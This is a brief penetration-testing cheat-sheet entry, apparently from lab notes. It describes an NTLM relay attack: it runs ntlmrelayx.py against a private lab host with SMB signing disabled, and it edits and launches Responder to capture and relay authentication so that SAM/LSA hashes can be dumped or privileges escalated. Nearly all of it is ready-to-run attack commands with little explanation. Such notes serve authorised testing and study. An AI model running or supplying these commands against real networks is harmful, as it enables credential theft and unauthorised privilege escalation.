this is used to Dump SAM/LSA hashes or escalate user, the relayed machine should have SMB Signing disable

```bash
sudo ntlmrelayx.py -t 10.10.111.12  -smb2support 2>/dev/null

-t -> target to be relayed to. # WS01 in this case
```

```bash
# first: sudo vi /etc/responder/Responder.conf
# Edit Responder settings: SMB = Off and HTTP = Off

sudo responder -I vmnet2 -dwv
```
